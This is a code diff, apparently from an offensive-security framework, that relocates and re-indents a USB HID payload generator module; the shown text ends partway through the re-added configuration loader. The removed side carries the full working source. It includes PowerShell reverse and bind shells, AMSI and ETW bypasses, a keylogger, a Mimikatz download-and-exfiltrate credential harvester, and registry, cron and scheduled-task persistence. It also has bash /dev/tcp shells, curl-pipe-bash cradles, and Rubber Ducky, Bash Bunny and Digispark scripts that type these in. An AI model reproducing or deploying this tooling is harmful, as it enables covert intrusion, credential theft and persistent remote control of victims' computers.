@@ -34423,5318 +34423,2552 @@ END:VCARD"""
             rows = f'<tr><td>1</td><td>{file_path}</td><td>{content}...</td><td class="{status_class}">{status_text}</td></tr>'
         return rows
 
-def run_usb_payload(self):
-    """
-    Enterprise USB Payload Generator
-    Main orchestrator for USB payload generation platform
-    """
-    from colorama import Fore, Style
-    import os
-    import time
-    import json
-    import base64
-    import hashlib
-    
-    print(f"\n{Fore.CYAN}{'=' * 70}")
-    print(f"  USB PAYLOAD GENERATOR - ENTERPRISE PLATFORM")
-    print(f"{'=' * 70}{Style.RESET_ALL}\n")
-    
-    # Load configuration
-    config = _load_usb_config(self)
-    if not config:
-        print(f"{Fore.RED}✗ ERROR: Failed to load configuration{Style.RESET_ALL}")
-        return
-    
-    # Display configuration
-    _display_usb_config(config)
-    
-    # Initialize database
-    if config['analytics']:
-        try:
-            _initialize_usb_database(config)
-            print(f"{Fore.GREEN}✓ Analytics database initialized{Style.RESET_ALL}\n")
-        except Exception as e:
-            print(f"{Fore.YELLOW}⚠ WARNING: Database initialization failed - continuing without analytics{Style.RESET_ALL}\n")
-    
-    # Create output directory
-    os.makedirs(config['output_dir'], exist_ok=True)
-    
-    # Check if batch mode
-    if config['batch_mode']:
-        print(f"{Fore.CYAN}━━━ BATCH GENERATION MODE ━━━{Style.RESET_ALL}\n")
-        results = _batch_generate_payloads(config)
-        _display_usb_results(results, config, batch=True)
-    else:
-        print(f"{Fore.CYAN}━━━ SINGLE PAYLOAD GENERATION ━━━{Style.RESET_ALL}\n")
-        result = _generate_single_payload(config)
-        _display_usb_results([result], config, batch=False)
-    
-    # Generate reports
-    if config['report_format'] != 'none':
-        print(f"\n{Fore.CYAN}━━━ GENERATING REPORTS ━━━{Style.RESET_ALL}\n")
-        _generate_usb_reports(config)
-    
-    # Cleanup if needed
-    if config['cleanup'] and not config['test_mode']:
-        _cleanup_temp_files(config)
-    
-    print(f"\n{Fore.GREEN}✓ USB Payload generation completed successfully{Style.RESET_ALL}\n")
-
-
-def _load_usb_config(self):
-    """
-    Load and validate USB payload configuration
-    Converts all module options to proper types with validation
-    """
-    try:
-        config = {
-            # Core
-            'campaign_name': str(self.module_options.get('campaign_name', 'usb_campaign')),
-            'payload_type': str(self.module_options.get('payload_type', 'reverse_shell')),
-            'target_os': str(self.module_options.get('target_os', 'windows')),
-            'output': str(self.module_options.get('output', 'payload.txt')),
-            'output_dir': str(self.module_options.get('output_dir', 'usb_payloads')),
-            
-            # Device
-            'device_type': str(self.module_options.get('device_type', 'rubber_ducky')),
-            'device_format': str(self.module_options.get('device_format', 'ducky_script')),
-            'usb_vendor_id': str(self.module_options.get('usb_vendor_id', '0x05AC')),
-            'usb_product_id': str(self.module_options.get('usb_product_id', '0x021E')),
-            'usb_serial': str(self.module_options.get('usb_serial', 'auto')),
-            'hid_mode': str(self.module_options.get('hid_mode', 'keyboard')),
-            
-            # Network
-            'lhost': str(self.module_options.get('lhost', self.config.get('lhost', '0.0.0.0'))),
-            'lport': str(self.module_options.get('lport', '4444')),
-            'callback_protocol': str(self.module_options.get('callback_protocol', 'tcp')),
-            'callback_interval': int(self.module_options.get('callback_interval', 5)),
-            'callback_jitter': int(self.module_options.get('callback_jitter', 20)),
-            'use_proxy': bool(self.module_options.get('use_proxy', False)),
-            'proxy_url': str(self.module_options.get('proxy_url', '')),
-            
-            # Payload encoding
-            'payload_encoding': str(self.module_options.get('payload_encoding', 'base64')),
-            'payload_compression': str(self.module_options.get('payload_compression', 'none')),
-            'payload_encryption': str(self.module_options.get('payload_encryption', 'none')),
-            'encryption_key': str(self.module_options.get('encryption_key', 'auto')),
-            'obfuscation_level': str(self.module_options.get('obfuscation_level', 'medium')),
-            'anti_av': bool(self.module_options.get('anti_av', True)),
-            'anti_sandbox': bool(self.module_options.get('anti_sandbox', True)),
-            'anti_debug': bool(self.module_options.get('anti_debug', True)),
-            
-            # Execution
-            'execution_method': str(self.module_options.get('execution_method', 'powershell')),
-            'execution_delay': int(self.module_options.get('execution_delay', 1000)),
-            'window_style': str(self.module_options.get('window_style', 'hidden')),
-            'admin_required': bool(self.module_options.get('admin_required', False)),
-            'uac_bypass': bool(self.module_options.get('uac_bypass', False)),
-            'uac_bypass_method': str(self.module_options.get('uac_bypass_method', 'fodhelper')),
-            
-            # Persistence
-            'persistence': bool(self.module_options.get('persistence', False)),
-            'persistence_method': str(self.module_options.get('persistence_method', 'registry_run')),
-            'persistence_name': str(self.module_options.get('persistence_name', 'WindowsUpdate')),
-            'persistence_interval': int(self.module_options.get('persistence_interval', 3600)),
-            'self_delete': bool(self.module_options.get('self_delete', False)),
-            'cleanup': bool(self.module_options.get('cleanup', True)),
-            
-            # Stealth
-            'keystroke_delay': int(self.module_options.get('keystroke_delay', 50)),
-            'typing_speed': str(self.module_options.get('typing_speed', 'normal')),
-            'clear_logs': bool(self.module_options.get('clear_logs', True)),
-            'disable_defender': bool(self.module_options.get('disable_defender', False)),
-            'disable_firewall': bool(self.module_options.get('disable_firewall', False)),
-            'disable_amsi': bool(self.module_options.get('disable_amsi', True)),
-            'disable_etw': bool(self.module_options.get('disable_etw', True)),
-            'process_injection': bool(self.module_options.get('process_injection', False)),
-            'inject_into': str(self.module_options.get('inject_into', 'explorer.exe')),
-            
-            # Exfiltration
-            'exfil_method': str(self.module_options.get('exfil_method', 'http')),
-            'exfil_url': str(self.module_options.get('exfil_url', '')),
-            'exfil_targets': str(self.module_options.get('exfil_targets', 'credentials')),
-            'exfil_path': str(self.module_options.get('exfil_path', '/tmp/exfil')),
-            'compress_exfil': bool(self.module_options.get('compress_exfil', True)),
-            'encrypt_exfil': bool(self.module_options.get('encrypt_exfil', True)),
-            
-            # Advanced
-            'multi_stage': bool(self.module_options.get('multi_stage', False)),
-            'stage1_url': str(self.module_options.get('stage1_url', '')),
-            'stage2_payload': str(self.module_options.get('stage2_payload', '')),
-            'download_cradle': str(self.module_options.get('download_cradle', 'iwr')),
-            'reflective_loading': bool(self.module_options.get('reflective_loading', False)),
-            'in_memory_execution': bool(self.module_options.get('in_memory_execution', True)),
-            'fileless': bool(self.module_options.get('fileless', True)),
-            
-            # Custom
-            'pre_commands': str(self.module_options.get('pre_commands', '')),
-            'post_commands': str(self.module_options.get('post_commands', '')),
-            'custom_script': str(self.module_options.get('custom_script', '')),
-            
-            # Batch
-            'batch_mode': bool(self.module_options.get('batch_mode', False)),
-            'batch_count': int(self.module_options.get('batch_count', 10)),
-            'batch_file': str(self.module_options.get('batch_file', '')),
-            'unique_payloads': bool(self.module_options.get('unique_payloads', True)),
-            'naming_pattern': str(self.module_options.get('naming_pattern', '{campaign}_{index}_{timestamp}')),
-            
-            # Analytics
-            'analytics': bool(self.module_options.get('analytics', True)),
-            'db_file': str(self.module_options.get('db_file', 'usb_payloads.db')),
-            'track_deployment': bool(self.module_options.get('track_deployment', True)),
-            'track_execution': bool(self.module_options.get('track_execution', True)),
-            'webhook_url': str(self.module_options.get('webhook_url', '')),
-            'notification_email': str(self.module_options.get('notification_email', '')),
-            
-            # Output
-            'generate_readme': bool(self.module_options.get('generate_readme', True)),
-            'generate_autorun': bool(self.module_options.get('generate_autorun', False)),
-            'generate_installer': bool(self.module_options.get('generate_installer', False)),
-            'bundle_resources': bool(self.module_options.get('bundle_resources', False)),
-            'report_format': str(self.module_options.get('report_format', 'all')),
-            'include_instructions': bool(self.module_options.get('include_instructions', True)),
-            
-            # Templates
-            'template': str(self.module_options.get('template', 'none')),
-            'template_customize': bool(self.module_options.get('template_customize', False)),
-            
-            # Platform-specific
-            'windows_version': str(self.module_options.get('windows_version', 'auto')),
-            'powershell_version': str(self.module_options.get('powershell_version', 'auto')),
-            'dotnet_version': str(self.module_options.get('dotnet_version', 'auto')),
-            'shell_type': str(self.module_options.get('shell_type', 'bash')),
-            'linux_distro': str(self.module_options.get('linux_distro', 'auto')),
-            'macos_version': str(self.module_options.get('macos_version', 'auto')),
-            'applescript': bool(self.module_options.get('applescript', False)),
-            
-            # Testing
-            'dry_run': bool(self.module_options.get('dry_run', False)),
-            'validate_syntax': bool(self.module_options.get('validate_syntax', True)),
-            'test_mode': bool(self.module_options.get('test_mode', False)),
-            'verbose': bool(self.module_options.get('verbose', False))
-        }
-        
-        return config
-    except Exception as e:
-        print(f"Error loading config: {str(e)}")
-        return None
-
-
-def _display_usb_config(config):
-    """Display USB payload configuration in organized format"""
-    from colorama import Fore, Style
-    
-    print(f"{Fore.CYAN}{'=' * 70}")
-    print(f"  CONFIGURATION")
-    print(f"{'=' * 70}{Style.RESET_ALL}\n")
-    
-    print(f"{Fore.YELLOW}  Campaign Configuration:{Style.RESET_ALL}")
-    print(f"    • Name:            {Fore.WHITE}{config['campaign_name']}{Style.RESET_ALL}")
-    print(f"    • Payload Type:    {Fore.WHITE}{config['payload_type']}{Style.RESET_ALL}")
-    print(f"    • Target OS:       {Fore.WHITE}{config['target_os']}{Style.RESET_ALL}")
-    print(f"    • Device Type:     {Fore.WHITE}{config['device_type']}{Style.RESET_ALL}")
-    print(f"    • Device Format:   {Fore.WHITE}{config['device_format']}{Style.RESET_ALL}")
-    
-    print(f"\n{Fore.YELLOW}  Network Configuration:{Style.RESET_ALL}")
-    print(f"    • LHOST:           {Fore.WHITE}{config['lhost']}:{config['lport']}{Style.RESET_ALL}")
-    print(f"    • Protocol:        {Fore.WHITE}{config['callback_protocol']}{Style.RESET_ALL}")
-    print(f"    • Interval:        {Fore.WHITE}{config['callback_interval']}s{Style.RESET_ALL}")
-    print(f"    • Jitter:          {Fore.WHITE}{config['callback_jitter']}%{Style.RESET_ALL}")
-    
-    print(f"\n{Fore.YELLOW}  Security & Evasion:{Style.RESET_ALL}")
-    print(f"    • Encoding:        {Fore.WHITE}{config['payload_encoding']}{Style.RESET_ALL}")
-    print(f"    • Obfuscation:     {Fore.WHITE}{config['obfuscation_level']}{Style.RESET_ALL}")
-    print(f"    • Anti-AV:         {Fore.GREEN if config['anti_av'] else Fore.RED}{'Enabled' if config['anti_av'] else 'Disabled'}{Style.RESET_ALL}")
-    print(f"    • Anti-Sandbox:    {Fore.GREEN if config['anti_sandbox'] else Fore.RED}{'Enabled' if config['anti_sandbox'] else 'Disabled'}{Style.RESET_ALL}")
-    print(f"    • Fileless:        {Fore.GREEN if config['fileless'] else Fore.RED}{'Enabled' if config['fileless'] else 'Disabled'}{Style.RESET_ALL}")
-    
-    print(f"\n{Fore.YELLOW}  Execution:{Style.RESET_ALL}")
-    print(f"    • Method:          {Fore.WHITE}{config['execution_method']}{Style.RESET_ALL}")
-    print(f"    • Window Style:    {Fore.WHITE}{config['window_style']}{Style.RESET_ALL}")
-    print(f"    • UAC Bypass:      {Fore.GREEN if config['uac_bypass'] else Fore.RED}{'Enabled' if config['uac_bypass'] else 'Disabled'}{Style.RESET_ALL}")
-    
-    if config['persistence']:
-        print(f"\n{Fore.YELLOW}  Persistence:{Style.RESET_ALL}")
-        print(f"    • Method:          {Fore.WHITE}{config['persistence_method']}{Style.RESET_ALL}")
-        print(f"    • Name:            {Fore.WHITE}{config['persistence_name']}{Style.RESET_ALL}")
-        print(f"    • Interval:        {Fore.WHITE}{config['persistence_interval']}s{Style.RESET_ALL}")
-    
-    print(f"\n{Fore.YELLOW}  Output:{Style.RESET_ALL}")
-    print(f"    • Directory:       {Fore.WHITE}{config['output_dir']}{Style.RESET_ALL}")
-    print(f"    • File:            {Fore.WHITE}{config['output']}{Style.RESET_ALL}")
-    print(f"    • Batch Mode:      {Fore.GREEN if config['batch_mode'] else Fore.RED}{'Enabled' if config['batch_mode'] else 'Disabled'}{Style.RESET_ALL}")
-    
-    if config['batch_mode']:
-        print(f"    • Batch Count:     {Fore.WHITE}{config['batch_count']}{Style.RESET_ALL}")
-    
-    print()
-
-
-def _initialize_usb_database(config):
-    """Initialize SQLite database for USB payload analytics"""
-    import sqlite3
-    
-    db_path = os.path.join(config['output_dir'], config['db_file'])
-    conn = sqlite3.connect(db_path)
-    cursor = conn.cursor()
-    
-    # Campaigns table
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS campaigns (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            name TEXT NOT NULL,
-            payload_type TEXT,
-            target_os TEXT,
-            device_type TEXT,
-            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            total_payloads INTEGER DEFAULT 0,
-            total_deployments INTEGER DEFAULT 0,
-            total_executions INTEGER DEFAULT 0,
-            status TEXT DEFAULT 'active'
-        )
-    ''')
-    
-    # Payloads table
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS payloads (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            campaign_id INTEGER,
-            payload_hash TEXT UNIQUE,
-            file_path TEXT,
-            device_type TEXT,
-            target_os TEXT,
-            payload_type TEXT,
-            encoding TEXT,
-            obfuscation_level TEXT,
-            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            deployment_count INTEGER DEFAULT 0,
-            execution_count INTEGER DEFAULT 0,
-            last_executed TIMESTAMP,
-            FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-        )
-    ''')
-    
-    # Deployments table
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS deployments (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            payload_id INTEGER,
-            deployed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            target_description TEXT,
-            notes TEXT,
-            FOREIGN KEY (payload_id) REFERENCES payloads(id)
-        )
-    ''')
-    
-    # Executions table
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS executions (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            payload_id INTEGER,
-            executed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            ip_address TEXT,
-            hostname TEXT,
-            username TEXT,
-            os_version TEXT,
-            success BOOLEAN,
-            callback_received BOOLEAN DEFAULT 0,
-            error_message TEXT,
-            FOREIGN KEY (payload_id) REFERENCES payloads(id)
-        )
-    ''')
-    
-    # Insert campaign record
-    cursor.execute('''
-        INSERT INTO campaigns (name, payload_type, target_os, device_type)
-        VALUES (?, ?, ?, ?)
-    ''', (config['campaign_name'], config['payload_type'], config['target_os'], config['device_type']))
-    
-    conn.commit()
-    conn.close()
-
-
-def _generate_single_payload(config):
-    """Generate a single USB payload based on configuration"""
-    from colorama import Fore, Style
-    import time
-    import hashlib
-    
-    print(f"{Fore.CYAN}→ Generating payload...{Style.RESET_ALL}")
-    
-    # Build payload content
-    payload_content = _build_payload_content(config)
-    
-    if not payload_content:
-        return {'success': False, 'error': 'Failed to build payload content'}
-    
-    # Apply obfuscation
-    if config['obfuscation_level'] != 'none':
-        payload_content = _obfuscate_payload(payload_content, config)
-    
-    # Apply encoding
-    if config['payload_encoding'] != 'none':
-        payload_content = _encode_payload(payload_content, config)
-    
-    # Format for device
-    final_payload = _format_for_device(payload_content, config)
-    
-    # Save payload
-    output_path = os.path.join(config['output_dir'], config['output'])
-    
-    try:
-        with open(output_path, 'w', encoding='utf-8') as f:
-            f.write(final_payload)
-        
-        # Calculate hash
-        payload_hash = hashlib.sha256(final_payload.encode()).hexdigest()
-        
-        # Log to database
-        if config['analytics']:
-            _log_payload_to_db(config, output_path, payload_hash)
-        
-        # Generate README if requested
-        if config['generate_readme']:
-            _generate_readme(config, output_path)
-        
-        print(f"{Fore.GREEN}✓ Payload generated successfully{Style.RESET_ALL}")
-        
-        return {
-            'success': True,
-            'file': output_path,
-            'hash': payload_hash,
-            'size': len(final_payload),
-            'lines': final_payload.count('\n')
-        }
-        
-    except Exception as e:
-        print(f"{Fore.RED}✗ Error saving payload: {str(e)}{Style.RESET_ALL}")
-        return {'success': False, 'error': str(e)}
-
-
-def _build_payload_content(config):
-    """Build payload content based on type and OS"""
-    payload_type = config['payload_type']
-    target_os = config['target_os']
-    
-    if target_os == 'windows':
-        return _build_windows_payload(config)
-    elif target_os == 'linux':
-        return _build_linux_payload(config)
-    elif target_os == 'macos':
-        return _build_macos_payload(config)
-    else:
-        return _build_multi_platform_payload(config)
-
-
-def _build_windows_payload(config):
-    """Build Windows-specific payload"""
-    payload_type = config['payload_type']
-    lhost = config['lhost']
-    lport = config['lport']
-    
-    # Pre-execution setup
-    setup = ""
-    if config['disable_amsi']:
-        setup += "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
-    
-    if config['disable_etw']:
-        setup += "[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0);"
-    
-    # Main payload
-    if payload_type == 'reverse_shell':
-        payload = f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
-$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
-$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
-$sendback = (iex $data 2>&1 | Out-String );
-$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
-$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}
-$client.Close()"""
-    
-    elif payload_type == 'bind_shell':
-        payload = f"""$listener = [System.Net.Sockets.TcpListener]{lport};
-$listener.start();$client = $listener.AcceptTcpClient();
-$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
-$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
-$sendback = (iex $data 2>&1 | Out-String );
-$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
-$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}
-$client.Close();$listener.Stop()"""
-    
-    elif payload_type == 'keylogger':
-        payload = f"""Add-Type -AssemblyName System.Windows.Forms;
-$LogPath = "$env:TEMP\\key.log";
-while($true){{
-for($i=0;$i-lt255;$i++){{
-if([System.Windows.Forms.Control]::IsKeyLocked([System.Windows.Forms.Keys]$i)){{
-$key=[System.Windows.Forms.Keys]$i;
-Add-Content $LogPath $key;
-}}}}
-Start-Sleep -Milliseconds 10;
-}}"""
-    
-    elif payload_type == 'credential_harvest':
-        payload = f"""IEX (New-Object Net.WebClient).DownloadString('http://{lhost}/Invoke-Mimikatz.ps1');
-Invoke-Mimikatz -DumpCreds | Out-File $env:TEMP\\creds.txt;
-$creds = Get-Content $env:TEMP\\creds.txt;
-$enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($creds));
-IWR -Uri http://{lhost}/exfil -Method POST -Body $enc;
-Remove-Item $env:TEMP\\creds.txt -Force"""
-    
-    elif payload_type == 'persistence':
-        persistence_methods = {
-            'registry_run': f"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{config['persistence_name']}' -Value 'powershell.exe -WindowStyle Hidden -File $env:TEMP\\payload.ps1' -Force",
-            'scheduled_task': f"schtasks /create /tn '{config['persistence_name']}' /tr 'powershell.exe -WindowStyle Hidden -File $env:TEMP\\payload.ps1' /sc minute /mo {config['persistence_interval']//60}",
-            'startup_folder': f"Copy-Item $PSCommandPath $env:APPDATA\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\{config['persistence_name']}.ps1"
-        }
-        payload = persistence_methods.get(config['persistence_method'], persistence_methods['registry_run'])
-    
-    else:
-        payload = f"# Custom payload for {payload_type}"
-    
-    return setup + payload
-
-
-def _build_linux_payload(config):
-    """Build Linux-specific payload"""
-    payload_type = config['payload_type']
-    lhost = config['lhost']
-    lport = config['lport']
-    shell = config['shell_type']
-    
-    if payload_type == 'reverse_shell':
-        return f"{shell} -i >& /dev/tcp/{lhost}/{lport} 0>&1"
-    elif payload_type == 'bind_shell':
-        return f"nc -lvp {lport} -e /bin/{shell}"
-    elif payload_type == 'persistence':
-        return f"(crontab -l ; echo '*/5 * * * * {shell} -i >& /dev/tcp/{lhost}/{lport} 0>&1')| crontab -"
-    else:
-        return f"# Custom {shell} payload"
-
-
-def _build_macos_payload(config):
-    """Build macOS-specific payload"""
-    payload_type = config['payload_type']
-    lhost = config['lhost']
-    lport = config['lport']
-    
-    if config['applescript']:
-        return f"""do shell script "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1" """
-    else:
-        return _build_linux_payload(config)  # macOS uses bash
-
-
-def _build_multi_platform_payload(config):
-    """Build multi-platform compatible payload"""
-    return f"""# Multi-platform payload
-# Windows
-powershell -Command "& {{IWR -Uri http://{config['lhost']}/payload.ps1 -OutFile $env:TEMP\\p.ps1; & $env:TEMP\\p.ps1}}"
-
-# Linux/macOS
-curl http://{config['lhost']}/payload.sh | bash
-"""
-
-
-def _obfuscate_payload(payload, config):
-    """Apply obfuscation to payload based on level"""
-    level = config['obfuscation_level']
-    
-    if level == 'low':
-        # Simple variable renaming
-        payload = payload.replace('$client', '$c').replace('$stream', '$s')
-    elif level == 'medium':
-        # Add random comments and spacing
-        import random
-        lines = payload.split('\n')
-        obfuscated = []
-        for line in lines:
-            if random.random() > 0.7:
-                obfuscated.append(f"# {random.randint(1000,9999)}")
-            obfuscated.append(line)
-        payload = '\n'.join(obfuscated)
-    elif level in ['high', 'extreme']:
-        # Heavy obfuscation with encoding
+    def run_usb_payload(self):
+        """
+        Enterprise USB Payload Generator
+        Main orchestrator for USB payload generation platform
+        """
+        from colorama import Fore, Style
+        import os
+        import time
+        import json
         import base64
-        payload_b64 = base64.b64encode(payload.encode()).decode()
-        payload = f"IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{payload_b64}')))"
-    
-    return payload
-
-
-def _encode_payload(payload, config):
-    """Encode payload based on encoding type"""
-    encoding = config['payload_encoding']
-    import base64
-    
-    if encoding == 'base64':
-        return base64.b64encode(payload.encode()).decode()
-    elif encoding == 'hex':
-        return payload.encode().hex()
-    elif encoding == 'rot13':
-        return ''.join([chr((ord(c) - 97 + 13) % 26 + 97) if c.islower() else 
-                       chr((ord(c) - 65 + 13) % 26 + 65) if c.isupper() else c 
-                       for c in payload])
-    else:
-        return payload
-
-
-def _format_for_device(payload, config):
-    """Format payload for specific device type"""
-    device = config['device_type']
-    device_format = config['device_format']
-    delay = config['execution_delay']
-    keystroke_delay = config['keystroke_delay']
-    
-    if device_format == 'ducky_script':
-        # Rubber Ducky script format
-        script = f"""REM USB Payload - {config['campaign_name']}
-REM Generated by KNDYS Framework
-REM Target: {config['target_os']}
-REM Type: {config['payload_type']}
-
-DELAY {delay}
-"""
-        if config['target_os'] == 'windows':
-            script += f"""GUI r
-DELAY 500
-STRING powershell -WindowStyle {config['window_style'].capitalize()}
-ENTER
-DELAY 1000
-"""
-            # Split payload into STRING commands
-            for line in payload.split('\n'):
-                if line.strip():
-                    script += f"STRING {line}\n"
-                    script += f"DELAY {keystroke_delay}\n"
-                    script += "ENTER\n"
+        import hashlib
         
-        elif config['target_os'] == 'linux':
-            script += f"""CTRL-ALT t
-DELAY 500
-"""
-            for line in payload.split('\n'):
-                if line.strip():
-                    script += f"STRING {line}\n"
-                    script += f"DELAY {keystroke_delay}\n"
-                    script += "ENTER\n"
+        print(f"\n{Fore.CYAN}{'=' * 70}")
+        print(f"  USB PAYLOAD GENERATOR - ENTERPRISE PLATFORM")
+        print(f"{'=' * 70}{Style.RESET_ALL}\n")
         
-        script += "\nDELAY 500\nSTRING exit\nENTER\n"
-        return script
-    
-    elif device_format == 'bash_bunny_payload':
-        # Bash Bunny payload format
-        return f"""#!/bin/bash
-# Bash Bunny Payload - {config['campaign_name']}
-LED R G B
-ATTACKMODE HID STORAGE
-LED R G
-Q GUI r
-Q DELAY 500
-Q STRING powershell
-Q ENTER
-Q DELAY 1000
-Q STRING {payload}
-Q ENTER
-LED G
-"""
-    
-    elif device_format == 'arduino_sketch':
-        # Arduino/Digispark format
-        return f"""#include "DigiKeyboard.h"
-void setup() {{
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
-  
-  // Open Run dialog
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  
-  // Type command
-  DigiKeyboard.print("powershell");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  
-  // Execute payload
-  DigiKeyboard.print("{payload.replace('"', '\\"')}");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-}}
-
-void loop() {{}}
-"""
-    
-    else:
-        return payload
-
-
-def _batch_generate_payloads(config):
-    """Generate multiple payloads in batch mode"""
-    from colorama import Fore, Style
-    import time
-    
-    batch_count = config['batch_count']
-    results = []
-    
-    print(f"{Fore.CYAN}Generating {batch_count} payloads...{Style.RESET_ALL}\n")
-    
-    for i in range(1, batch_count + 1):
-        # Generate unique filename
-        timestamp = int(time.time())
-        filename = config['naming_pattern'].format(
-            campaign=config['campaign_name'],
-            index=i,
-            timestamp=timestamp
-        ) + '.txt'
+        # Load configuration
+        config = _load_usb_config(self)
+        if not config:
+            print(f"{Fore.RED}✗ ERROR: Failed to load configuration{Style.RESET_ALL}")
+            return
         
-        # Update config for this payload
-        batch_config = config.copy()
-        batch_config['output'] = filename
+        # Display configuration
+        _display_usb_config(config)
         
-        # Add uniqueness if requested
-        if config['unique_payloads']:
-            batch_config['callback_interval'] = config['callback_interval'] + (i % 10)
-            batch_config['callback_jitter'] = config['callback_jitter'] + (i % 20)
+        # Initialize database
+        if config['analytics']:
+            try:
+                _initialize_usb_database(config)
+                print(f"{Fore.GREEN}✓ Analytics database initialized{Style.RESET_ALL}\n")
+            except Exception as e:
+                print(f"{Fore.YELLOW}⚠ WARNING: Database initialization failed - continuing without analytics{Style.RESET_ALL}\n")
         
-        # Generate payload
-        print(f"{Fore.CYAN}→ [{i}/{batch_count}] Generating {filename}...{Style.RESET_ALL}", end='')
-        result = _generate_single_payload(batch_config)
+        # Create output directory
+        os.makedirs(config['output_dir'], exist_ok=True)
         
-        if result['success']:
-            print(f" {Fore.GREEN}✓{Style.RESET_ALL}")
-            results.append(result)
+        # Check if batch mode
+        if config['batch_mode']:
+            print(f"{Fore.CYAN}━━━ BATCH GENERATION MODE ━━━{Style.RESET_ALL}\n")
+            results = _batch_generate_payloads(config)
+            _display_usb_results(results, config, batch=True)
         else:
-            print(f" {Fore.RED}✗ {result.get('error', 'Unknown error')}{Style.RESET_ALL}")
-            results.append(result)
+            print(f"{Fore.CYAN}━━━ SINGLE PAYLOAD GENERATION ━━━{Style.RESET_ALL}\n")
+            result = _generate_single_payload(config)
+            _display_usb_results([result], config, batch=False)
         
-        time.sleep(0.1)  # Small delay between generations
+        # Generate reports
+        if config['report_format'] != 'none':
+            print(f"\n{Fore.CYAN}━━━ GENERATING REPORTS ━━━{Style.RESET_ALL}\n")
+            _generate_usb_reports(config)
+        
+        # Cleanup if needed
+        if config['cleanup'] and not config['test_mode']:
+            _cleanup_temp_files(config)
+        
+        print(f"\n{Fore.GREEN}✓ USB Payload generation completed successfully{Style.RESET_ALL}\n")
     
-    return results
-
-
-def _log_payload_to_db(config, file_path, payload_hash):
-    """Log payload generation to database"""
-    import sqlite3
     
-    db_path = os.path.join(config['output_dir'], config['db_file'])
-    try:
+    def _load_usb_config(self):
+        """
+        Load and validate USB payload configuration
+        Converts all module options to proper types with validation
+        """
+        try:
+            config = {
+                # Core
+                'campaign_name': str(self.module_options.get('campaign_name', 'usb_campaign')),
+                'payload_type': str(self.module_options.get('payload_type', 'reverse_shell')),
+                'target_os': str(self.module_options.get('target_os', 'windows')),
+                'output': str(self.module_options.get('output', 'payload.txt')),
+                'output_dir': str(self.module_options.get('output_dir', 'usb_payloads')),
+                
+                # Device
+                'device_type': str(self.module_options.get('device_type', 'rubber_ducky')),
+                'device_format': str(self.module_options.get('device_format', 'ducky_script')),
+                'usb_vendor_id': str(self.module_options.get('usb_vendor_id', '0x05AC')),
+                'usb_product_id': str(self.module_options.get('usb_product_id', '0x021E')),
+                'usb_serial': str(self.module_options.get('usb_serial', 'auto')),
+                'hid_mode': str(self.module_options.get('hid_mode', 'keyboard')),
+                
+                # Network
+                'lhost': str(self.module_options.get('lhost', self.config.get('lhost', '0.0.0.0'))),
+                'lport': str(self.module_options.get('lport', '4444')),
+                'callback_protocol': str(self.module_options.get('callback_protocol', 'tcp')),
+                'callback_interval': int(self.module_options.get('callback_interval', 5)),
+                'callback_jitter': int(self.module_options.get('callback_jitter', 20)),
+                'use_proxy': bool(self.module_options.get('use_proxy', False)),
+                'proxy_url': str(self.module_options.get('proxy_url', '')),
+                
+                # Payload encoding
+                'payload_encoding': str(self.module_options.get('payload_encoding', 'base64')),
+                'payload_compression': str(self.module_options.get('payload_compression', 'none')),
+                'payload_encryption': str(self.module_options.get('payload_encryption', 'none')),
+                'encryption_key': str(self.module_options.get('encryption_key', 'auto')),
+                'obfuscation_level': str(self.module_options.get('obfuscation_level', 'medium')),
+                'anti_av': bool(self.module_options.get('anti_av', True)),
+                'anti_sandbox': bool(self.module_options.get('anti_sandbox', True)),
+                'anti_debug': bool(self.module_options.get('anti_debug', True)),
+                
+                # Execution
+                'execution_method': str(self.module_options.get('execution_method', 'powershell')),
+                'execution_delay': int(self.module_options.get('execution_delay', 1000)),
+                'window_style': str(self.module_options.get('window_style', 'hidden')),
+                'admin_required': bool(self.module_options.get('admin_required', False)),
